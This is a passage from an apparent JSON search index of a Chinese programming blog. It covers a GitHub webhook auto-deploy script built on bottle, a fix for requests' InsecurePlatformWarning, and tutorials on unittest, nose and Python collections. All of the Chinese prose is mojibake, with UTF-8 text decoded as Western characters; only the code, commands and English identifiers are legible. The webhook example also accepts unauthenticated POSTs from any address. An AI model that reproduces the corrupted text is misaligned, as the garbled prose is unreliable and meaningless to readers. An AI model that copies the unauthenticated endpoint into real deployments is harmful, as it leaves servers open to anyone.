æ‰€æœ‰æœåŠ¡æ­£å¸¸è¿è¡Œï¼Œè®¿é—®.gitç›®å½•æ—¶ä¼šè¿”å›403.SimpleHTTPServeråœ¨å»ºç«‹æœåŠ¡å™¨çš„æ—¶å€™åªèƒ½ç›‘å¬0.0.0.0è€Œä¸èƒ½åªç›‘å¬127.0.0.1, ä¹‹å‰æ­å»ºæœåŠ¡å™¨çš„æ—¶å€™ç”¨çš„SimpleHTTPServer+Nginxåå‘ä»£ç†ï¼Œç°åœ¨çœ‹èµ·æ¥æ„Ÿè§‰æˆ‘å°±æ˜¯ä¸ªå‚»é€¼â€¦ 2.2 å€ŸåŠ©Webhookå®ç°åšå®¢çš„è‡ªåŠ¨éƒ¨ç½²å› ä¸ºä¹‹å‰é™æ€åšå®¢æ‰˜ç®¡åœ¨Github Pagesä¸Šï¼Œæ‰€ä»¥å‘Github Repoä¸Šé¢è¿›è¡Œpushæ“ä½œä¹‹åä¼šåŠ¨æ€æ›´æ–°é¡µé¢ã€‚ä½†æ˜¯å¦‚æœå°†é™æ€åšå®¢æ‰˜ç®¡åœ¨VPSä¸Šï¼Œåˆ™éœ€è¦æ¯æ¬¡æ‰§è¡Œgit pullæ‰èƒ½å¤Ÿå°†å†…å®¹æ›´æ–°ã€‚æ‰€ä»¥æˆ‘åœ¨VPSä¸Šå†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œèƒ½å¤Ÿåœ¨Pushä¹‹åè‡ªåŠ¨è¿›è¡Œgit pullæ¥æ›´æ–°å†…å®¹ã€‚åœ¨Githubä¸Šçš„repoè®¾ç½®Webhookåœ¨repoçš„è®¾ç½®é¡µé¢å¯ä»¥è®¾ç½®Webhook, å¯åœ¨è¯¥repoæ”¶åˆ°pushä¹‹åï¼ŒGithubå¯ä»¥å‘ä¸€ä¸ªç‰¹å®šçš„URLå‘é€ä¸€ä¸ªPOSTè¯·æ±‚ã€‚æ‰€ä»¥æˆ‘è®¾ç½®äº†ä¸€ä¸ªWebhook, åœ¨pushä¹‹åå¯ä»¥å‘æˆ‘çš„VPSçš„ç‰¹å®šç«¯å£å‘é€POSTè¯·æ±‚ã€‚è®¾ç½®æœåŠ¡å™¨æ¥æ”¶Webhookåœ¨VPSä¸­é…ç½®ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¼€æ”¾VPSçš„ä¸€ä¸ªç«¯å£æ¥æ¥æ”¶æ¥è‡ªGithubçš„Webhookï¼Œè¿™é‡Œä½¿ç”¨bottleæ¥æ­å»ºæœåŠ¡å™¨æ¡†æ¶ã€‚æœåŠ¡å™¨ä»£ç :123456789101112#!/usr/bin/env python# coding: utf-8import osfrom bottle import *@route(\"/push\", method=[\"POST\"]) # ç›‘å¬Webhookdef pull(): os.system(\"./auto_pull.sh\") # æ‰§è¡Œgit pullè„šæœ¬ return \"OK\"run(host=\"0.0.0.0\", port=23333)ç¼–å†™è‡ªåŠ¨pullè„šæœ¬ç¼–å†™è‡ªåŠ¨pullè„šæœ¬auto_pull.sh:1234#!/usr/bin/env shcd ~/bloggit pullè¿è¡ŒæœåŠ¡å™¨ï¼Œåˆ™å¯ç›‘å¬23333ç«¯å£çš„POSTè¯·æ±‚ï¼Œç„¶åè‡ªåŠ¨æ‰§è¡Œgit pullæ›´æ–°åšå®¢å†…å®¹ã€‚ 3. åè®°è‡³æ­¤ï¼Œåšå®¢éƒ¨åˆ†æˆåŠŸè¿ç§»åˆ°VPS.ä¸ºä»€ä¹ˆè¦è¯´â€œéƒ¨åˆ†â€ï¼Ÿå› ä¸ºæˆ‘çš„åŸŸååœ¨åšå¤‡æ¡ˆå•ŠQvQå¤‡æ¡ˆå¥½éº»çƒ¦è¿˜è¦æ‰“å°ææ–™è¿˜è¦è·‘åˆ°å¸‚ä¸­å¿ƒå»ç…§ç›¸è¿˜è¦å‘å¿«é€’åˆ°åŒ—äº¬QvQéƒ½åšå¥½è¿˜å¾—ç­‰å¾…ç®¡å±€å®¡æ ¸QvQåæ§½æ—¶é—´ç»“æŸã€‚åé¢ç­‰åŸŸåå¤‡æ¡ˆå¥½ä»¥åå¯èƒ½ä¼šé¼“æ£ä¸€é˜µå­Nginxï¼Œä¸ºæœåŠ¡å™¨å¯ç”¨HTTPSç­‰â€¦å”‰ï¼Œè¿˜æ˜¯å…ˆå»å¤ä¹ å§_(:Ğ·ã‚âˆ )__åœ¨å†™åšæ–‡æ—¶ï¼Œå»ç¼–è¯‘å‡çº§äº†ä¸€ä¸‹Nginx, é¼“æ£é…ç½®æ–‡ä»¶åˆå¼„äº†åŠå¤©_â•®(â•¯_â•°)â•­","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"Github","slug":"Github","permalink":"https://blog.stdioa.com/tags/Github/"}]},{"title":"éšæ‰‹è®° - è§£å†³InsecurePlatformWarning","slug":"essay-solve-InsecurePlatformWarning","date":"2015-12-07T15:01:00.000Z","updated":"2018-07-12T00:15:03.564Z","comments":true,"path":"2015/12/essay-solve-InsecurePlatformWarning/","link":"","permalink":"https://blog.stdioa.com/2015/12/essay-solve-InsecurePlatformWarning/","excerpt":"ç¬¬ä¸‰æ¬¡åœ¨VPSä¸Šé¢è§£å†³ä½¿ç”¨requestsæŠ¥InsecurePlatformWarningè­¦å‘Šçš„é—®é¢˜ã€‚ä¹‹å‰æ¯æ¬¡éƒ½è¦æŸ¥èµ„æ–™æŠ˜è…¾å¥½ä¹…ï¼Œè¿™æ¬¡å†³å®šæŠŠå®ƒè®°ä¸‹æ¥ã€‚","text":"ç¬¬ä¸‰æ¬¡åœ¨VPSä¸Šé¢è§£å†³ä½¿ç”¨requestsæŠ¥InsecurePlatformWarningè­¦å‘Šçš„é—®é¢˜ã€‚ä¹‹å‰æ¯æ¬¡éƒ½è¦æŸ¥èµ„æ–™æŠ˜è…¾å¥½ä¹…ï¼Œè¿™æ¬¡å†³å®šæŠŠå®ƒè®°ä¸‹æ¥ã€‚ 1. å¹²è´§Debianç±»ç³»ç»Ÿsudo apt-get install python-dev libssl-devsudo pip install -U requests[security]Redhatç±»ç³»ç»Ÿsudo yum install python-devel openssl-develsudo pip install -U requests[security] 2. éœ€æ±‚è‡ªå·±çš„VPSç³»ç»Ÿæœ‰ç‚¹è€(Ubuntu 14.04 LTS), æ‰€ä»¥pythonç‰ˆæœ¬ä¹Ÿæ¯”è¾ƒè½å(Python 2.7.3), ä»Šå¤©æ”¹ä»£ç éœ€è¦ç”¨åˆ°requestsæ–°ç‰ˆæœ¬ä¸­æä¾›çš„åŠŸèƒ½ï¼Œä½†æ˜¯requestså‡çº§åå‘é€HTTPSè¯·æ±‚æ—¶ä¼šæŠ¥å‡ºInsecurePlatformWarning, è¿™æ˜¯ä¸€ä¸ªç”±opensslæ¼æ´(Heartbleed)é€ æˆçš„è­¦å‘Šï¼Œæ‰€ä»¥éœ€è¦å‡çº§pyopensslç­‰æ¨¡å—ã€‚ 3. å‡çº§è¿‡ç¨‹pypiæä¾›äº†ä¸€ä¸ªå‡çº§åŒ…ï¼Œå«åšrequests[security], ç”¨pipè¿›è¡Œå‡çº§å³å¯ã€‚è¾“å…¥sudo pip install requests[security]å‘½ä»¤åï¼ŒpipæŠ¥é”™ï¼Œæ‰å‘ç°ä¸èƒ½æœ¬åœ°ç¼–è¯‘pythonåŒ…ï¼Œé‚å®‰è£…python-dev. ç„¶åå†æ¬¡å®‰è£…æ—¶å‘ç°ç¼ºå°‘openssl/aes.hå¤´æ–‡ä»¶ï¼Œåˆå»å®‰è£…opensslçš„å¼€å‘åŒ…libssl-dev, å†æ¬¡å®‰è£…ï¼Œå®‰è£…æˆåŠŸã€‚ 4. å‚è€ƒèµ„æ–™[åŸ]pipå®‰è£…æ¨¡å—è­¦å‘ŠInsecurePlatformWarningzsh - no matches found: requests[security]","categories":[{"name":"éšæ‰‹è®°","slug":"éšæ‰‹è®°","permalink":"https://blog.stdioa.com/categories/éšæ‰‹è®°/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"openssl","slug":"openssl","permalink":"https://blog.stdioa.com/tags/openssl/"},{"name":"requests","slug":"requests","permalink":"https://blog.stdioa.com/tags/requests/"}]},{"title":"Pythonå­¦ä¹ ä¹‹unittest","slug":"learning-python-unittest","date":"2015-11-12T10:53:02.000Z","updated":"2018-07-12T11:35:13.432Z","comments":true,"path":"2015/11/learning-python-unittest/","link":"","permalink":"https://blog.stdioa.com/2015/11/learning-python-unittest/","excerpt":"å•å…ƒæµ‹è¯•ï¼Œå·¥ç¨‹å¼€å‘ä¸­é‡è¦çš„ä¸€ç¯ã€‚","text":"å•å…ƒæµ‹è¯•ï¼Œå·¥ç¨‹å¼€å‘ä¸­é‡è¦çš„ä¸€ç¯ã€‚ 1. ç®€ä»‹å•å…ƒæµ‹è¯•æ˜¯ç”¨æ¥å¯¹ä¸€ä¸ªæ¨¡å—ã€ä¸€ä¸ªå‡½æ•°æˆ–è€…ä¸€ä¸ªç±»æ¥è¿›è¡Œæ­£ç¡®æ€§æ£€éªŒçš„æµ‹è¯•å·¥ä½œã€‚ 2. ä½¿ç”¨unittestè¿›è¡Œæµ‹è¯•unittestæ˜¯Pythonè‡ªå¸¦çš„å•å…ƒæµ‹è¯•æ¨¡å—ï¼Œé€šè¿‡ç¼–å†™æµ‹è¯•ç±»ï¼Œåœ¨æµ‹è¯•ç±»ä¸­ç¼–å†™æµ‹è¯•å‡½æ•°çš„æ–¹å¼è¿›è¡Œæµ‹è¯•ã€‚ä¸çŸ¥é“è¯¥æµ‹è¯•ä»€ä¹ˆï¼Œå°±å¯¹pythonçš„listå¯¹è±¡æµ‹è¯•ä¸€ä¸‹å¥½äº†ã€‚ 2.1 ç¼–å†™æµ‹è¯•æ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# coding: utf-8import unittest # ä½¿ç”¨unittestæ¨¡å—class TestStringMethods(unittest.TestCase): # æµ‹è¯•ç±»éœ€ç»§æ‰¿è‡ªunittest.TestCase def setUp(self): # åœ¨å‡½æ•°é‡Œè¿›è¡Œæµ‹è¯•ä¹‹å‰éœ€è¦è¿›è¡Œçš„ä¸€äº›å‡†å¤‡å·¥ä½œï¼ŒsetUpåœ¨æ¯æ¬¡æµ‹è¯•ä¹‹å‰éƒ½ä¼šè¿è¡Œä¸€æ¬¡ self.d = [] def test_empty(self): \"\"\"\\ Empty testcase \"\"\" self.assertEqual([], []) # è‹¥aå’Œbç›¸ç­‰åˆ™é€šè¿‡ self.assertNotEqual([1], []) # è‹¥ä¸ç›¸ç­‰åˆ™é€šè¿‡ def test_bool(self): \"\"\"\\ Bool transform testcase \"\"\" self.assertTrue([1]) # è‹¥å†…éƒ¨çš„è¡¨è¾¾å¼æˆ–å¯¹è±¡ä¸ºçœŸåˆ™é€šè¿‡ self.assertFalse([]) # ä¸ºå‡åˆ™é€šè¿‡ self.assertTrue(bool([1])) self.assertFalse(bool([])) def test_append(self): \"\"\"\\ Append testcase \"\"\" list_ = [] list_.append(1) self.assertEqual(list_, [1]) self.assertNotEqual(list_, []) list_.append(2) self.assertIn(1, list_) # è‹¥a in båˆ™é€šè¿‡ self.assertNotIn(3, list_) # è‹¥a not in båˆ™é€šè¿‡ self.assertTrue(list_[0] == 1) self.assertEqual(list_[1], 2) def test_instance(self): list_ = [] self.assertIsInstance(list_, list) # è‹¥isinstance(a, b)ä¸ºçœŸåˆ™é€šè¿‡ self.assertNotIsInstance(list_, str) # è‹¥isinstance(a, b)ä¸ºå‡åˆ™é€šè¿‡ def test_index(self): \"\"\"\\ Index testcase \"\"\" list_ = [] with self.assertRaises(IndexError): # æ£€æµ‹æ˜¯å¦æœ‰å¼‚å¸¸æŠ›å‡ºï¼Œæœ‰æŒ‡å®šå¼‚å¸¸æŠ›å‡ºåˆ™é€šè¿‡ a = list_[0] list_ = [1, 2, 3] self.assertEqual(list_[1], 2) self.assertEqual(list_[-2], 2) with self.assertRaises(IndexError): a = list_[4] def tearDown(self): # åœ¨æµ‹è¯•ä¹‹åéœ€è¦è¿›è¡Œçš„ä¸€äº›å¤„ç†äº‹é¡¹ï¼ŒtearDownåœ¨æ¯æ¬¡æµ‹è¯•ä¹‹åéƒ½ä¼šè¿è¡Œä¸€æ¬¡ del self.dif __name__ == '__main__': __import__(\"sys\").argv.append(\"-v\") # é‡‡ç”¨verboseæ–¹å¼ï¼Œè¾“å‡ºæµ‹è¯•ä¿¡æ¯ unittest.main() 2.2 è¿è¡Œæµ‹è¯•ç›´æ¥è¿è¡Œæµ‹è¯•ç¨‹åºï¼Œè¾“å‡º:1234567891011121314test_append (__main__.TestStringMethods)Append testcase ... oktest_bool (__main__.TestStringMethods)Bool transform testcase ... oktest_empty (__main__.TestStringMethods)Empty testcase ... oktest_index (__main__.TestStringMethods)Index testcase ... oktest_instance (__main__.TestStringMethods) ... ok----------------------------------------------------------------------Ran 5 tests in 0.001sOKè¿è¡Œpython -m unittest test.pyä¹Ÿå¯ä»¥è¿›è¡Œæµ‹è¯•ï¼›è¿è¡Œpython -m unittest, unittestä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æµ‹è¯•ç±»è¿›è¡Œæµ‹è¯•ï¼ˆçœŸæ™ºèƒ½ï¼‰ï¼›è‹¥æœ‰æµ‹è¯•æœªé€šè¿‡ï¼Œunittestä¼šåœ¨æµ‹è¯•æ—¶æŠ¥å‘ŠFAIL, å¹¶åœ¨æµ‹è¯•ç»“æŸåå°†æ‰€æœ‰æœªé€šè¿‡æµ‹è¯•çš„é¡¹ç›®åˆ—å‡ºã€‚ 3. ä½¿ç”¨Noseè¿›è¡Œå•å…ƒæµ‹è¯•Noseæ˜¯ä¸€ä¸ªå¯¹unittestçš„æ‰©å±•æµ‹è¯•æ¡†æ¶ï¼Œèƒ½è‡ªåŠ¨å‘ç°å¹¶è¿è¡Œæµ‹è¯•ã€‚ä½¿ç”¨Noseï¼Œå¯ä»¥å°†å•å…ƒæµ‹è¯•ä»£ç çš„ç¼–å†™å˜å¾—æ›´ç®€å•ï¼Œä¸ç”¨å†æ„é€ æµ‹è¯•ç±»ï¼Œåªéœ€è¦åœ¨ä»¥testå¼€å¤´çš„æ–‡ä»¶ä¸­å»ºç«‹ä»¥testå¼€å¤´çš„å‡½æ•°å³å¯ã€‚ 3.1 ç¼–å†™æµ‹è¯•æ–‡ä»¶123456789101112131415# coding: utf-8import nosedef test_nose_installed_successfully(): import nose # è¿è¡Œæµ‹è¯•ä»£ç  assert True # assert Trueè¡¨ç¤ºæµ‹è¯•æˆåŠŸdef test_obviously_failed(): assert False # assert Falseè¡¨ç¤ºæµ‹è¯•å¤±è´¥ï¼Œæµ‹è¯•æ—¶ä¼šæŠ¥\"FAIL\"def test_returns_an_exception(): raise ValueError # è‹¥æŠ›å‡ºé™¤AssertionErrorçš„å¼‚å¸¸ï¼Œæµ‹è¯•æ—¶ä¼šæŠ¥\"ERROR\"nose.main() 3.2 è¿è¡Œæµ‹è¯•æ–‡ä»¶noseè‡ªå¸¦å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦è¾“å…¥nosetests [æµ‹è¯•æ–‡ä»¶å]å³å¯ï¼Œè‹¥æµ‹è¯•æ–‡ä»¶åä¸ºç©ºï¼Œåˆ™nosetestä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹å¯»æ‰¾æ‰€æœ‰æµ‹è¯•ã€‚ä»¥ä¸‹å‘½ä»¤æ ¼å¼å‡å¯æ¥å—ï¼š1234nosetests test.modulenosetests another.test:TestCase.test_methodnosetests a.test:TestCasenosetests /path/to/test/file.py:test_functionè¿è¡Œnosetests test_with_nose -vï¼Œè¾“å‡ºï¼š1234567891011121314151617181920212223242526272829$ nosetests test_with_nose -vtest_with_nose.test_nose_installed_successfully ... oktest_with_nose.test_obviously_failed ... FAILtest_with_nose.test_returns_an_exception ... ERROR======================================================================ERROR: test_with_nose.test_returns_an_exception----------------------------------------------------------------------Traceback (most recent call last): File \"c:\\python35\\lib\\site-packages\\nose\\case.py\", line 198, in runTest self.test(*self.arg) File \"C:\\Users\\Stdio\\Desktop\\temp\\utest\\test_with_nose.py\", line 13, in test_returns_an_exception raise ValueErrorValueError======================================================================FAIL: test_with_nose.test_obviously_failed----------------------------------------------------------------------Traceback (most recent call last): File \"c:\\python35\\lib\\site-packages\\nose\\case.py\", line 198, in runTest self.test(*self.arg) File \"C:\\Users\\Stdio\\Desktop\\temp\\utest\\test_with_nose.py\", line 10, in test_obviously_failed assert FalseAssertionError----------------------------------------------------------------------Ran 3 tests in 0.003sFAILED (errors=1, failures=1) 4. å‚è€ƒæ–‡æ¡£unitest - Python Docå•å…ƒæµ‹è¯• - å»–é›ªå³°çš„pythonæ•™ç¨‹Nose documentationPythonçš„å­¦ä¹ ï¼ˆåå…«ï¼‰---- å•å…ƒæµ‹è¯•å·¥å…·nose 5. åè®°æ‹–äº†ä¸€ä¸ªæœˆï¼Œè¿™ä¸ªå‘å†ä¸å¡«æ—¥å­æ²¡æ³•è¿‡äº†(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»åˆ°ç°åœ¨æ²¡ç»™è‡ªå·±çš„ä»£ç å†™è¿‡æµ‹è¯•ï¼Œä¹Ÿæ˜¯é†‰â€¦ä¸€ç›´æƒ³è½¬Py3ä¸€ç›´æ²¡è½¬ï¼Œæ˜¨å¤©æ”¹äº†ç¯å¢ƒå˜é‡ï¼Œå¼ºè¿«è‡ªå·±ç”¨ä¸€é˜µå­ï¼Œå¤šå»çœ‹çœ‹Py3çš„ç‰¹æ€§ï¼Œæœ‰æ—¶é—´æ•´ç†ä¸€ä¸‹ã€‚Gitçš„å‘è¿˜æ²¡å¡«å®Œä¸è¿‡è‡ªå·±çš„Pro Gitçœ‹çš„å·®ä¸å¤šäº†ï¼Œè²Œä¼¼ä¹Ÿæ»¡è¶³è‡ªå·±çš„éœ€æ±‚äº†ï¼Œå‡†å¤‡å¼ƒå‘ã€‚ä¸‹ä¸€ç¯‡æœ‰å¯èƒ½æ˜¯SQLAlchemy, MongoDB, Flaskâ€¦å“ï¼Œéšå®ƒå»å§ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"unittest","slug":"unittest","permalink":"https://blog.stdioa.com/tags/unittest/"}]},{"title":"Pythonå­¦ä¹ ä¹‹collections","slug":"learning-python-collections","date":"2015-10-29T12:55:00.000Z","updated":"2018-07-12T00:14:51.557Z","comments":true,"path":"2015/10/learning-python-collections/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-collections/","excerpt":"collectionæ˜¯Pythonå†…å»ºçš„ä¸€ä¸ªå®ç”¨å·¥å…·åŒ…ï¼Œæä¾›ä¸€äº›ä½¿ç”¨çš„å®¹å™¨ï¼Œç”¨äºå¯¹ä¼ ç»Ÿå®¹å™¨ç±»å‹è¿›è¡ŒåŠŸèƒ½æå‡ã€‚","text":"collectionæ˜¯Pythonå†…å»ºçš„ä¸€ä¸ªå®ç”¨å·¥å…·åŒ…ï¼Œæä¾›ä¸€äº›ä½¿ç”¨çš„å®¹å™¨ï¼Œç”¨äºå¯¹ä¼ ç»Ÿå®¹å™¨ç±»å‹è¿›è¡ŒåŠŸèƒ½æå‡ã€‚ 1. ç®€ä»‹ä¸Šé¢å°±æ˜¯ç®€ä»‹ï¼Œä¸ä¼šæ‰¯äº†ï¼Œè´´ä¸¤ä¸ªé“¾æ¥å¥½äº†ã€‚Collections - å»–é›ªå³°çš„Pythonæ•™ç¨‹Collections - High-performance container datatypes - Python Doc 2. namedtuple 2.1 åŠŸèƒ½ç®€ä»‹namedtupleä¸ºä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºäº§ç”Ÿä¸€ä¸ªtupleç±»çš„å­ç±»ã€‚ç”±è¯¥ç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å¯ä»¥åƒtupleä¸€æ ·pack/unpackï¼Œä¹Ÿå¯ä»¥é€šè¿‡é¢„å…ˆå®šä¹‰å¥½çš„æˆå‘˜åç§°è®¿é—®å¯¹è±¡å†…éƒ¨çš„æ•°æ®ã€‚ä¾‹ï¼š123456789101112131415161718&gt;&gt;&gt; from collections import namedtuple&gt;&gt;&gt; Point = namedtuple(\"Point\", ['x', 'y'])&gt;&gt;&gt; Point # namedtupleå‡½æ•°è¿”å›ä¸€ä¸ªç±»&lt;class '__main__.Point'&gt;&gt;&gt;&gt; Point.__base__&lt;type 'tuple'&gt;&gt;&gt;&gt; Point(x=1, y=2)Point(x=1, y=2)&gt;&gt;&gt; Point(1,2) # ä¸¤ç§å®šä¹‰æ–¹å¼å‡å¯ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼ŒPointçš„å‚æ•°é•¿åº¦æ˜¯ä¸å¯å˜çš„Point(x=1, y=2)&gt;&gt;&gt; p = Point(1, 2)&gt;&gt;&gt; p.x1&gt;&gt;&gt; x, y = p # å¯ä»¥åƒtupleä¸€æ ·è¿›è¡Œunpack&gt;&gt;&gt; x1&gt;&gt;&gt; Point._make((1,2)) # packçš„æ–¹å¼å’Œtupleä¸åŒPoint(x=1, y=2) 2.2 æˆå‘˜å‡½æ•°somenamedtuple._make(iterable), å°†ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼ˆlist, tupleç­‰ï¼‰è½¬åŒ–ä¸ºä¸€ä¸ªnamedtupleå¯¹è±¡ã€‚123&gt;&gt;&gt; t = [11, 22]&gt;&gt;&gt; Point._make(t)Point(x=11, y=22)somenamedtuple._asdict(), å°†å¯¹è±¡è½¬åŒ–ä¸€ä¸ªä¸ºé”®å€¼å’Œæ•°æ®å¯¹åº”çš„OrderedDict.12&gt;&gt;&gt; p._asdict()OrderedDict([('x', 11), ('y', 22)])somenamedtuple._replace(kwargs), è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸­çš„å€¼æŒ‰ç…§_replaceå‡½æ•°ä¸­çš„å‚æ•°æ‰€æ”¹å˜ã€‚123&gt;&gt;&gt; p = Point(x=11, y=22)&gt;&gt;&gt; p._replace(x=33)Point(x=33, y=22)somenamedtuple._fields, è¿”å›ä¸€ä¸ªæ‰€æœ‰é”®å€¼æ„æˆçš„dict.1234567&gt;&gt;&gt; p._fields # æŸ¥çœ‹é”®å€¼åå­—('x', 'y')&gt;&gt;&gt; Color = namedtuple('Color', 'red green blue')&gt;&gt;&gt; Pixel = namedtuple('Pixel', Point._fields + Color._fields) # å°†Colorå’ŒPointâ€œåˆå¹¶â€&gt;&gt;&gt; Pixel(11, 22, 128, 255, 0)Pixel(x=11, y=22, red=128, green=255, blue=0) 2.3 åº”ç”¨åœºæ™¯åˆ—ä¸¾ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼šåœ¨è¿›è¡ŒsqlæŸ¥è¯¢æ—¶ï¼Œcur.fetchone()ä¼šè¿”å›ä¸€ä¸ªtupleè€Œä¸æ˜¯dictï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªnamedtuple, ç„¶åå°†sqlçš„æŸ¥è¯¢æ•°æ®è½¬ä¸ºnamedtupleç±»ï¼Œç„¶åé€šè¿‡æˆå‘˜å‡½æ•°è®¿é—®ã€‚ä¸¾ä¸ªæ —å­ï¼ˆç§è´§ï¼‰ï¼š1234567891011121314Account = namedtuple(\"Account\", [\"username\", \"password\"]) # å®šä¹‰Accountç±»...cur = self.db.cursor()cur.execute(\"SELECT username, password FROM account\\ WHERE valid=1\\ ORDER BY RANDOM()\\ LIMIT 1\")account= Account._make(cur.fetchone()) # å°†æ•°æ®tupleè½¬ä¸ºAccountå¯¹è±¡self.postdata[\"username\"] = account.username # ç›´æ¥è®¿é—®æˆå‘˜æ•°æ®self.postdata[\"password\"] = account.password...# self.login(username, password)self.login(account) # å¯ä»¥å°†accountæ•´ä½“ä½œä¸ºå‚æ•°ï¼Œä½¿ç¨‹åºçœ‹èµ·æ¥æ›´ç®€æ´... 3. deque - åŒç«¯é˜Ÿåˆ— 3.1 ä»‹ç»dequeä¸ºDouble-Ended Queueçš„ç®€å†™ï¼Œç”¨äºæä¾›ä¸€ä¸ªå¯ä»¥å¿«é€Ÿè¿›è¡Œä¸¤ç«¯çš„æ’å…¥æˆ–åˆ é™¤æ“ä½œçš„é˜Ÿåˆ—ï¼ŒåŒæ—¶å¯ä»¥åƒlistä¸€æ ·é€šè¿‡ä¸‹æ ‡è®¿é—®æ•°æ®ã€‚ç”±äºlistæ˜¯å‚¨å­˜åœ¨çº¿æ€§ç©ºé—´çš„ï¼Œå…¶æ’å…¥/åˆ é™¤æ•°æ®çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œæ‰€ä»¥å½“listæ¯”è¾ƒé•¿çš„æ—¶å€™ï¼Œåœ¨å…¶å¤´éƒ¨æ’å…¥/åˆ é™¤æ•°æ®çš„æ“ä½œéœ€è¦è€—è´¹å¤§é‡æ—¶é—´ã€‚æ‰€ä»¥å¦‚æœéœ€è¦å¯¹listå¯¹è±¡è¿›è¡Œå¤§é‡å¤´å’Œå°¾çš„æ’å…¥åˆ é™¤æ“ä½œæ—¶ï¼Œä½¿ç”¨dequeä¼šä½¿ç¨‹åºçš„è¿è¡Œæ•ˆç‡æ›´é«˜ï¼ˆå½“ç„¶ï¼Œä½¿ç”¨Queueæ¨¡å—çš„Queueå’ŒLifoQueueä¹Ÿæ˜¯ä¸é”™çš„é€‰æ‹©ï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdequeå¯¹è±¡ä¸æ”¯æŒåœ¨ä¸­é—´ä½ç½®çš„æ’å…¥æ“ä½œã€‚dequeå¯¹è±¡ä¹Ÿè¢«åŒ…å«åœ¨Queueæ¨¡å—ä¸­ã€‚ 3.2 æˆå‘˜å‡½æ•°append(x), appendleft(x), åœ¨dequeçš„å°¾/å¤´æ’å…¥å¯¹è±¡x, ä¸listç±»ä¼¼ï¼›extend(iterable), extendleft(iterable), ä¸listçš„extendç±»ä¼¼ï¼›pop(x), popleft(x), ä¸listçš„popç±»ä¼¼ï¼›clear(), æ¸…ç©ºdequeçš„æ‰€æœ‰å…ƒç´ ï¼›count(x), ç»Ÿè®¡dequeä¸­xå…ƒç´ çš„ä¸ªæ•°ï¼›remove(x), åˆ é™¤dequeä¸­çš„xå…ƒç´ ï¼Œè‹¥xå…ƒç´ ä¸å­˜åœ¨ï¼Œåˆ™è§¦å‘ValueError;reverse(), å°†dequeåè½¬ï¼Œè¿”å›None, ä¸listçš„reverseç±»ä¼¼;rotate(i), å°†dequeæœ€æœ«å°¾iä¸ªå…ƒç´ å–å‡ºå¹¶æ’å…¥å¤´éƒ¨ï¼Œè‹¥i&lt;0, åˆ™å°†å¤´éƒ¨|i|ä¸ªå…ƒç´ å–å‡ºæ·»åŠ åˆ°å°¾éƒ¨ã€‚ 4. Counter - è®¡æ•°å™¨ 4.1 ä»‹ç»Counterç±»æ˜¯dictçš„å­ç±»ï¼Œæä¾›ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå¯å¯¹hashableçš„å¯¹è±¡è¿›è¡Œè®¡æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹è±¡çš„è®¡æ•°å¯ä»¥å°äº0. 4.2 åŸºæœ¬æ“ä½œç›´æ¥ä¸Šä¾‹å­ï¼š12345678910&gt;&gt;&gt; c = Counter() # ç©ºè®¡æ•°å™¨&gt;&gt;&gt; c = Counter('gallahad') # å¯¹iterableå¯¹è±¡ä¸­çš„å…ƒç´ è¿›è¡Œè®¡æ•°&gt;&gt;&gt; c = Counter(&#123;'red': 4, 'blue': 2&#125;) # ä»mapä¸­è¯»å–å…ƒç´ å’Œå¯¹åº”è®¡æ•°&gt;&gt;&gt; c = Counter(cats=4, dogs=8) # ä»å…³é”®å­—å‚æ•°ä¸­è·å–&gt;&gt;&gt; cCounter(&#123;'dogs': 8, 'cats': 4&#125;)&gt;&gt;&gt; c[\"dogs\"] # è·å–è®¡æ•°8&gt;&gt;&gt; c[\"elephants\"] # å¯¹äºä¸å­˜åœ¨çš„å…ƒç´ ï¼Œä¼šè¿”å›0 0 4.3 æˆå‘˜å‡½æ•°elements(), è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼ŒåŒ…å«Counterä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œè‹¥å…ƒç´ xçš„è®¡æ•°ä¸ºnï¼Œåˆ™xåœ¨è¿­ä»£å™¨ä¸­ä¼šå‡ºç°næ¬¡ã€‚123c = Counter(a=4, b=2, c=0, d=-2)&gt;&gt;&gt; list(c.elements())['a', 'a', 'a', 'a', 'b', 'b']most_common([n]), è¿”å›è®¡æ•°æœ€å¤šçš„nä¸ªå…ƒç´ ã€‚12&gt;&gt;&gt; Counter('abracadabra').most_common(3)[('a', 5), ('r', 2), ('b', 2)]update([iterable-or-mapping]), åœ¨ç°æœ‰è®¡æ•°ä¸Šæ·»åŠ å‚æ•°æ‰€å¯¹åº”çš„è®¡æ•°ã€‚123456&gt;&gt;&gt; c = Counter(\"1233\")&gt;&gt;&gt; cCounter(&#123;'3': 2, '1': 1, '2': 1&#125;)&gt;&gt;&gt; 